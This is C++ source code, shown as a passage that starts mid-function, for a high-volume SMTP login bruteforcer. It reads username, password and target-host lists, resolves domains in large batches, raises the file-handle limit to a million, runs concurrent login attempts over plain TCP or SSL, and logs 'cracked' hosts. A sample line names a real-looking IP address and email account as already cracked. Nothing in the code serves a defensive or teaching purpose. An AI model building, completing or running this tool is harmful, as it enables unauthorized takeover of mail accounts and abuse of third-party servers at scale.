			__local_addr.push_back(addr);
			if (i != j)
				__local_ips[j] = __local_ips[i];
		}
	}

	__local_ips.erase(__local_ips.begin() + __local_addr.size(), __local_ips.end());
}


void init_smtp_bruteforcer() {

#ifdef _D_SMTP_OVER_SSL
	std::cout << "SMTP with SSL." << std::endl;

	init_OpenSSL();
#else
	std::cout << "SMTP." << std::endl;
#endif

	if (globs.cfg.log_bad) {
		remove(globs.bad_filename);
	}

	read_cracked_ips(globs.valid_filename, __cracked_map);

	load_localips();

	read_words(globs.subs_filename, __subs);

	for (unsigned i = 0; i < __subs.size(); i++) {
		__subs_len.push_back((int)strlen(__subs[i]));
	}

}

#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <math.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/sysinfo.h>
#include <sys/resource.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include <iostream>
#include <fstream>
#include <map>
#include <vector>
#include <set>


/*
	Base 64 Encoder based on the solution by René Nyffenegger:
		http://www.adp-gmbh.ch/cpp/common/base64.html
*/

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(char c)
{
	return (isalnum(c) || (c == '+') || (c == '/'));
}

int base64_encode(const char* in_buf, int in_size, char* out_buf, int out_capacity)
{
	int out_size = 0;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];
	while (in_size--) {
		char_array_3[i++] = *(in_buf++);
		if (i >= 3) {
			char_array_4[0] = (unsigned char)(char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = (unsigned char)(((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4));
			char_array_4[2] = (unsigned char)(((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6));
			char_array_4[3] = (unsigned char)char_array_3[2] & 0x3f;

			for (i = 0; i < 4; i++) {
				if (out_size >= out_capacity) {
					return -1;//Error: buffer to small.
				}
				out_buf[out_size++] = base64_chars[char_array_4[i]];
			}
			i = 0;
		}
	}
	if (i) {
		for (j = i; j < 3; j++) {
			char_array_3[j] = '\0';
		}
		char_array_4[0] = (unsigned char)(char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = (unsigned char)(((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4));
		char_array_4[2] = (unsigned char)(((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6));
		char_array_4[3] = (unsigned char)char_array_3[2] & 0x3f;
		for (j = 0; j < i + 1; j++) {
			if (out_size >= out_capacity) {
				return -1;//Error: buffer to small.
			}
			out_buf[out_size++] = base64_chars[char_array_4[j]];
		}
		while (i++ < 3) {
			if (out_size >= out_capacity) {
				return -1;//Error: buffer to small.
			}
			out_buf[out_size++] = '=';
		}
	}
	return out_size;
}

void free_words(void* ptr) {
	char* data = static_cast<char*>(ptr);

	delete[] data;
}

//Read words from a file, splitting on whitespace and newlines.
void* read_words(const char* fname, std::vector<char*>& words)
{
	char* data = nullptr;

	FILE* f = fopen(fname, "rb");
	if (!f) {
		return 0;
	}
	//Read the whole file in.
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	if (fsize > 0) {
		rewind(f);
		data = new char[fsize + 1];
		if (!data) {
			//Out of memory.
			fclose(f);
			return 0;
		}
		int n_read = (int)fread(data, fsize, 1, f);
		if (n_read != 1) {
			//Error reading the whole file.
			delete[] data;
		}
		else {
			data[fsize] = 0;
			//Split the text by whitespace and newlines.
			int start = 0;
			int end = 0;
			while (true) {
				//Search for the beginning of the next word.
				while (data[start] && isspace(data[start])) {
					++start;
				}
				//Search for the end of the word.
				end = start;
				while (data[end] && !isspace(data[end])) {
					++end;
				}
				if (end <= start) {
					break;//End of the buffer is reached.
				}

				//Insert into the array.
				words.push_back(&data[start]);

				data[end] = 0;

				start = end + 1;
				if (start >= fsize) {
					break;
				}
			}
			//Don't delete the data. It's gonna be used throughout the program and freed automatically on exit.
		}
	}
	fclose(f);

#if 0
	if (words.size() > 0) {
		std::cout << std::endl << "Read from '" << fname << "':" << std::endl;
		for (auto w : words) {
			std::cout << w << "~" << std::endl;
		}
	}
#endif

	if (words.size() <= 0) {
		std::cout << "There is no data in '" << fname << "'" << std::endl;
		return nullptr;
	}

	return static_cast<void*>(data);
}

bool replace(std::string& str, const std::string& from, const std::string& to)
{
	size_t start_pos = str.find(from);
	if (start_pos == std::string::npos) {
		return false;
	}
	str.replace(start_pos, from.length(), to);
	return true;
}


//Make all letters capital.
void uppercase(const char* from, char* to)
{
	int i = 0;
	while (from[i]) {
		to[i] = (char)toupper(from[i]);
		++i;
	}
	to[i] = 0;
}

//Make only first letter capital.
void capitalize(const char* from, char* to)
{
	int i = 0;
	while (from[i]) {
		if (i == 0) {
			to[i] = (char)toupper(from[i]);
		}
		else {
			to[i] = from[i];
		}
		++i;
	}
	to[i] = 0;
}

bool are_coprime(unsigned a, unsigned b)
{
	while (a > 0)
	{
		unsigned n = b % a;
		if (n == 1)
			return true;
		b = a;
		a = n;
	}
	return false;
}

//Does a string ends with a suffix?
bool ends_with(const char* str, int str_len, const char* suffix, int suffix_len)
{
	if (str_len < suffix_len) {
		return false;
	}
	for (int i = 0; i < suffix_len; i++) {
		if (str[str_len - 1 - i] != suffix[suffix_len - 1 - i]) {
			return false;
		}
	}
	return true;
}


//Read in the list of already cracked IPs.
void read_cracked_ips(const char* fname, std::map<uint32_t, int>& map)
{
	FILE* f = fopen(fname, "rb");
	if (!f) {
		return;
	}
	//Read the whole file in.
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	if (fsize > 0) {
		rewind(f);
		char *data = new char[fsize + 1];
		if (!data) {
			//Out of memory.
			fclose(f);
			return;
		}
		size_t n_read = fread(data, fsize, 1, f);
		//Line example:
		//52.220.170.171 sales@stacks.targetr.net sales
		bool first_on_line = true;//Each line is split by whitespace, and only the first element (the IP address) is taken.
		if (n_read != 1) {
			//Error reading the whole file.
		}
		else {
			data[fsize] = 0;
			//std::cout << data << std::flush;

			//Parse the IPs into the map.
			int start = 0;
			int end = 0;
			while (true) {
				//Search for the beginning of the next word.
				while (data[start] && isspace(data[start])) {
					if (data[start] == '\n' || data[start] == '\r') {
						first_on_line = true;//Just moved to a new line.
					}
					++start;
				}
				//Search for the end of the word.
				end = start;
				while (data[end] && !isspace(data[end])) {
					++end;
				}

				if (end <= start) {
					break;//End of the buffer is reached.
				}

				if (first_on_line) {
					std::string ip(&data[start], end - start);
					uint32_t addr;
					if (1 != inet_pton(AF_INET, ip.c_str(), &addr)) {
						// std::cerr << "Invalid host address: " << ip.c_str() << std::endl;
					}
					//Insert into the map.
					map[addr] = 1;
					first_on_line = false;
				}

				start = end;
			}
		}
		delete[] data;
	}
	fclose(f);

#if 0
	std::cout << "Already cracked IPs read from '" << fname << "':" << std::endl;
	for (auto p : cracked_map) {
		std::cout << p.first.c_str() << "~" << std::endl;
	}
#endif
}

//Estimate time to completion and print N days, hours, minutes.
void format_time_left(double sec_left, char* str, int str_size)
{
	if (sec_left < 60.0) {
		snprintf(str, str_size, "< 1 m");
		return;
	}

	const double sec_in_day = 24.0 * 60.0 * 60.0;
	const double sec_in_hr = 60.0 * 60.0;
	const double sec_in_min = 60.0;

	double days = floor(sec_left / sec_in_day);
	sec_left -= days * sec_in_day;

	double hrs = floor(sec_left / sec_in_hr);
	sec_left -= hrs * sec_in_hr;

	double mins = floor(sec_left / sec_in_min);
	sec_left -= mins * sec_in_min;

	snprintf(str, str_size, "%.f d, %.f h, %.f m", days, hrs, mins);
}

time_t get_current_time() {
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec;
}

void set_handles_limit(int nmax) {
	struct rlimit rl;
	rl.rlim_cur = nmax;
	rl.rlim_max = nmax;

	if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
		std::cerr << "setrlimit failed with error : " << strerror(errno) << std::endl;
		//exit(1);
	}
	else {
		std::cout << "setrlimit OK: " << nmax << std::endl;
	}
}


sockaddr_in host_to_sockaddr(const char* host, uint16_t port) {
	sockaddr_in addr;

	addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	if (1 != inet_pton(AF_INET, host, &addr.sin_addr)) {
		std::cerr << "Invalid host address: " << host << std::endl;
	}

	return addr;
}

bool hostname_to_ip(const char * hostname, char* ip)
{
	struct hostent *he = gethostbyname(hostname);

	if (!he)
		return false;

	struct in_addr ** addr_list = (struct in_addr **) he->h_addr_list;

	for (int i = 0; addr_list[i] != NULL; i++)
	{
		//Return the first one;
		strcpy(ip, inet_ntoa(*addr_list[i]));
		return true;
	}

	return false;
}

uint32_t hostname_to_addr(const char * hostname)
{
	struct hostent *he = gethostbyname(hostname);

	if (!he)
		return 0;

	struct in_addr ** addr_list = (struct in_addr **) he->h_addr_list;

	for (int i = 0; addr_list[i] != NULL; i++)
	{
		//Return the first one;
		return addr_list[i]->s_addr;
	}

	return 0;
}


static pthread_mutex_t *lock_cs;
static long *lock_count;

void pthreads_locking_callback(int mode, int type, char *file, int line)
{
# if 0
	fprintf(stderr, "thread=%4d mode=%s lock=%s %s:%d\n",
		CRYPTO_thread_id(),
		(mode & CRYPTO_LOCK) ? "l" : "u",
		(type & CRYPTO_READ) ? "r" : "w", file, line);
# endif
# if 0
	if (CRYPTO_LOCK_SSL_CERT == type)
		fprintf(stderr, "(t,m,f,l) %ld %d %s %d\n",
			CRYPTO_thread_id(), mode, file, line);
# endif
	if (mode & CRYPTO_LOCK) {
		pthread_mutex_lock(&(lock_cs[type]));
		lock_count[type]++;
	}
	else {
		pthread_mutex_unlock(&(lock_cs[type]));
	}
}

unsigned long pthreads_thread_id(void)
{
	unsigned long ret;

	ret = (unsigned long)pthread_self();
	return (ret);
}

void CRYPTO_thread_setup(void)
{
	int i;

	lock_cs = (pthread_mutex_t *)OPENSSL_malloc(CRYPTO_num_locks() * sizeof(pthread_mutex_t));
	lock_count = (long*)OPENSSL_malloc(CRYPTO_num_locks() * sizeof(long));
	if (!lock_cs || !lock_count) {
		/* Nothing we can do about this...void function! */
		if (lock_cs)
			OPENSSL_free(lock_cs);
		if (lock_count)
			OPENSSL_free(lock_count);
		return;
	}
	for (i = 0; i < CRYPTO_num_locks(); i++) {
		lock_count[i] = 0;
		pthread_mutex_init(&(lock_cs[i]), NULL);
	}

	CRYPTO_set_id_callback((unsigned long(*)())pthreads_thread_id);
	CRYPTO_set_locking_callback((void(*)(int, int, const char*, int))pthreads_locking_callback);
}

void thread_cleanup(void)
{
	int i;

	CRYPTO_set_locking_callback(NULL);
	for (i = 0; i < CRYPTO_num_locks(); i++) {
		pthread_mutex_destroy(&(lock_cs[i]));
	}
	OPENSSL_free(lock_cs);
	OPENSSL_free(lock_count);
}


void init_OpenSSL() {
	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();
	ERR_load_BIO_strings();
	ERR_load_crypto_strings();
	SSL_library_init();

	CRYPTO_thread_setup();

	std::cout << "OpenSSL version: " << SSLeay_version(SSLEAY_VERSION) << std::endl;
}


globs_t globs;

bool _do_print_stat = true;
int64_t _total_tasks = 0;
int64_t _total_hosts = 0;
int _awaiting_domains_counter = 0;

#ifdef _D_SMTP_OVER_SSL
#define _D_SSL "SSL"
#else
#define _D_SSL "TCP"
#endif

void* stat_thread_proc(void*) {
	time_t t1 = time(0);

	usleep(100000);//Polling interval, microseconds.

	while (_do_print_stat) {
		usleep(500000);//Polling interval, microseconds.

		int64_t processed = globs.processed_tasks_counter.load();

		time_t t2 = time(0);
		double elapsed = difftime(t2, t1);//Time in seconds since the program started.
		double pcent = 100.0 * (double)processed / (double)_total_tasks;
		int jobs_per_sec = (int)((double)processed / elapsed);
		int conn_per_sec = (int)(globs.established_connections_counter / elapsed);
		int login_per_sec = (int)(globs.login_attempts_counter / elapsed);
		double efficiency = 100.0 * globs.login_attempts_counter / (double)processed;

		if (jobs_per_sec < 0) jobs_per_sec = 0;
		if (conn_per_sec < 0) conn_per_sec = 0;
		if (login_per_sec < 0) login_per_sec = 0;

		char time_left[64] = { 0 };
		if (processed > 0) {
			double sec_left = elapsed / (double)(processed) * (double)(_total_tasks - processed);//Estimated seconds to completion.
			format_time_left(sec_left, time_left, 64);
		}
		else {
			strcpy(time_left, "-");
		}

#ifdef _D_IPS_ARE_DOMAINS
		printf("\nDomains checked: %d, cache %d / %d (%d)| IPs: %d | Await: %d | DNS timeouts: %d",
			globs.checked_domains_counter.load(), globs.domains_from_cache_counter.load(),
			_total_hosts, globs.running_dns_counter.load(),
			globs.good_domains_counter.load(), _awaiting_domains_counter, globs.dns_timeout_error_counter.load());
#endif

		printf("\n%.2f s | %.2f %% | %d Login att/s | %d " _D_SSL " conn/s | %d tasks/s | efficiency: %.2f %% | Time left: %s",
			elapsed, pcent, login_per_sec, conn_per_sec, jobs_per_sec, efficiency, time_left);

		fflush(stdout);

		printf("\nCracked: %d | Login attempts: %d | SMTP errors: %d | TCP timeouts: %d | " _D_SSL " errors: %d | Connect errors: %d",
			globs.cracked_hosts_counter.load(), globs.login_attempts_counter.load(), globs.smtp_error_counter.load(),
			globs.timeout_counter.load(), globs.tcpandsll_errors_counter.load(), globs.connect_errors_counter.load());

		fflush(stdout);

		printf("\nrunning tasks: %d | running " _D_SSL " connections: %d\n",
			globs.running_tasks_counter.load(), globs.running_connections_counter.load());

		fflush(stdout);

	}

	return nullptr;
}

void convert_ips_to_sockaddr(const std::vector<char*>& hosts, std::vector<sockaddr_in>& hosts_addr) {

	hosts_addr.resize(hosts.size());

	//Convert IP strings to numeric addresses checking validity in the process.
	for (int i = 0; i < (int)hosts.size(); i++) {
		sockaddr_in addr = { 0 };
		const char* hostip = hosts[i];

		addr.sin_family = AF_INET;
		addr.sin_port = htons((uint16_t)globs.cfg.port_number);
		if (1 != inet_pton(AF_INET, hostip, &addr.sin_addr)) {
#ifdef _D_IPS_ARE_DOMAINS
			addr.sin_addr.s_addr = 1; // try to resolve
#else
			std::cerr << "Invalid host address: " << hostip << std::endl;
#endif
		}

		hosts_addr[i] = addr;
	}
}

bool read_inputs(brute_inputs& info) {

	if (!read_words(globs.users_filename, info.users)) {
		return false;//There is no work to be done.
	}
	if (!read_words(globs.pass_filename, info.passchains)) {
		return false;//There is no work to be done.
	}
	if (!read_words(globs.hosts_filename, info.hosts)) {
		return false;//There is no work to be done.
	}

	_total_tasks = info.users.size() * info.passchains.size() * info.hosts.size();
	_total_hosts = info.hosts.size();

	if (!_total_tasks)
		return true;

	return true;
}

void process_arguments(int argc, char** argv) {

	if (argc >= 2 && (0 == strcmp(argv[1], "a"))) {
		//Create the files, if they don't exist.
		fopen(globs.hosts_filename, "a");
		fopen(globs.users_filename, "a");
		fopen(globs.pass_filename, "a");
		exit(0);
	}

	int optc;
	while ((optc = getopt(argc, argv, "d:c:p:t:hbs")) != -1)
	{
		switch (optc)
		{
		case 'd': // debug option
			globs.cfg.debug = (int)atol(optarg);
			break;
		case 'b':
			globs.cfg.log_bad = 1;
			break;
		case 'c':
			globs.cfg.number_of_threads = (int)atol(optarg);
			break;
		case 't':
			globs.cfg.connection_timeout_sec = (int)atol(optarg);
			break;
		case 'p':
			globs.cfg.port_number = (int)atol(optarg);
			break;
		case 's':
			globs.cfg.use_simple_username = true;
			break;

		default:
			break;
		}

	}

	if (optind < argc)
		globs.cfg.max_concurrent_connections = (int)atol(argv[optind++]);

	if (globs.cfg.max_concurrent_connections <= 0) {
		globs.cfg.max_concurrent_connections = 1;
	}

	if (globs.cfg.connection_timeout_sec <= 0) {
		globs.cfg.connection_timeout_sec = 7;
	}

	if (globs.cfg.port_number <= 0) {
#ifdef _D_SMTP_OVER_SSL
		globs.cfg.port_number = 465; // TCP(SMTP over SSL);
#else
		globs.cfg.port_number = 25;
#endif
	}

	if (globs.cfg.debug == 5) {
		globs.cfg.print_stat = true;
	}

	if (globs.cfg.number_of_threads <= 0) {
		std::cout << "Number of CPU cores: " << get_nprocs() << std::endl << std::endl;

		globs.cfg.number_of_threads = get_nprocs();
	}

	std::cout << "Port: " << globs.cfg.port_number << std::endl;
	std::cout << "N connections: " << globs.cfg.max_concurrent_connections << std::endl;
	std::cout << "N threads: " << globs.cfg.number_of_threads << std::endl;
	std::cout << "Debug level: " << globs.cfg.debug << std::endl;
	std::cout << "TCP timeout: " << globs.cfg.connection_timeout_sec << " seconds" << std::endl;

	if (globs.cfg.log_bad) {
		std::cout << "Logging bad hosts to '" << globs.bad_filename << "'" << std::endl;
	}
}


void cut_hosts(std::vector<char*>& source, int count, std::vector<char*>& dest) {
	if (source.size() > count) {

		dest.assign(source.end() - count, source.end());
		source.resize(source.size() - count);

	}
	else {

		dest = std::move(source);

	}
}

bool cut_hosts_and_resolve(std::vector<char*>& source_hosts, int count, std::vector<char*>& dest_hosts,
	std::vector<sockaddr_in>& dest_addrs) {

	cut_hosts(source_hosts, count, dest_hosts);

	convert_ips_to_sockaddr(dest_hosts, dest_addrs);

	return resolve_domains(dest_hosts, dest_addrs);
}

void cut_and_append_resolved(std::vector<char*>& source_hosts, int count, std::vector<char*>& dest_hosts,
	std::vector<sockaddr_in>& dest_addrs) {

	std::vector<char*> hosts;
	std::vector<sockaddr_in> hosts_addr;

	if (source_hosts.empty())
		return;

	cut_hosts_and_resolve(source_hosts, count, hosts, hosts_addr);

	// Reserve memory to make it a bit faster..
	dest_hosts.reserve(dest_hosts.size() + hosts.size());
	dest_addrs.reserve(dest_addrs.size() + hosts_addr.size());

	// Append new hosts/addresses to dest vectors.
	dest_hosts.insert(dest_hosts.end(), hosts.begin(), hosts.end());
	dest_addrs.insert(dest_addrs.end(), hosts_addr.begin(), hosts_addr.end());
}


class bruteforcer_wrapper {
	brute_inputs& _targets;
	bool _is_burte_running = false;
	pthread_t _thbrute = 0;

	void* blocking_thread_proc(void*) {

		bruteforce_smtp(_targets);
		_is_burte_running = false;
		_thbrute = 0;
		return nullptr;
	}

public:

	bruteforcer_wrapper(brute_inputs& targets) :_targets(targets) {}

	bool is_running() { return _is_burte_running; }

	void start() {

		_is_burte_running = true;

		pthread_create(&_thbrute, 0, (void * (*)(void *))&bruteforcer_wrapper::blocking_thread_proc, this);

	}

	void wait() {
		if (_is_burte_running &&_thbrute)
			pthread_join(_thbrute, nullptr);
	}
};

void bruteforce_smtp_domains(brute_inputs& targets) {
	bruteforcer_wrapper bruteforcer(targets);
	int dns_block_size = 80000;
	const int brute_block_size = 250000;
	int timeout_before_next_resovle = 15; // seconds

	std::vector<char*> allhosts = std::move(targets.hosts);
	std::vector<char*> hosts;
	std::vector<sockaddr_in> hosts_addr;

	time_t timestamp = 0;

	while (allhosts.size() || hosts.size()) {

		if (get_current_time() - timestamp > timeout_before_next_resovle) {

			timestamp = get_current_time();
			cut_and_append_resolved(allhosts, dns_block_size, hosts, hosts_addr);
			_awaiting_domains_counter = hosts.size();

			// Too fast, seems like loaded from cache and we don't have to wait
			if ((get_current_time() - timestamp <= 5 || globs.checked_domains_counter < 10000) &&
				!allhosts.empty()
				) {
				timestamp = 0;
				continue;
			}

			timestamp = get_current_time();
		}

		if ((hosts.size() >= brute_block_size || allhosts.empty()) && !bruteforcer.is_running()) {

			timeout_before_next_resovle = 30;

			_awaiting_domains_counter = 0;

			targets.hosts = std::move(hosts);
			targets.hosts_addr = std::move(hosts_addr);

			std::cout << "start..." << std::endl;

			bruteforcer.start();

		}

		usleep(1000000);
	}

	bruteforcer.wait();
}

void resolve_smtp_domains(brute_inputs& targets) {
	const int max_block_size = 80000;
	const int timeout_before_next_resovle = 10; // seconds
	time_t timestamp = 0;

	std::vector<char*> allhosts = std::move(targets.hosts);
	std::vector<char*> hosts;
	std::vector<sockaddr_in> hosts_addr;

	while (allhosts.size() || hosts.size()) {

		if (get_current_time() - timestamp > timeout_before_next_resovle) {
			std::cout << "Start." << std::endl;
			cut_and_append_resolved(allhosts, max_block_size, hosts, hosts_addr);
			timestamp = get_current_time();
			std::cout << "Wait..." << std::endl;

		}

		hosts.clear();
		hosts_addr.clear();

		usleep(1000000);
	}
}

int main(int argc, char** argv)
{
	pthread_t thstat = 0;

	set_handles_limit(1000000);

	srand(get_current_time());

	process_arguments(argc, argv);

	init_smtp_bruteforcer();

	brute_inputs targets;

	if (!read_inputs(targets)) {
		std::cerr << "There are no targets." << std::endl;
		return 0;
	}

	if (globs.cfg.print_stat) {
		pthread_create(&thstat, 0, stat_thread_proc, nullptr);
	}

	// Few moments to see startup configuration
	usleep(1000000);

#ifdef _D_IPS_ARE_DOMAINS

	bruteforce_smtp_domains(targets);

#else

	convert_ips_to_sockaddr(targets.hosts, targets.hosts_addr);

	bruteforce_smtp(targets);

#endif

	_do_print_stat = false;

	if (thstat) {
		pthread_join(thstat, nullptr);
	}

	return 0;
}


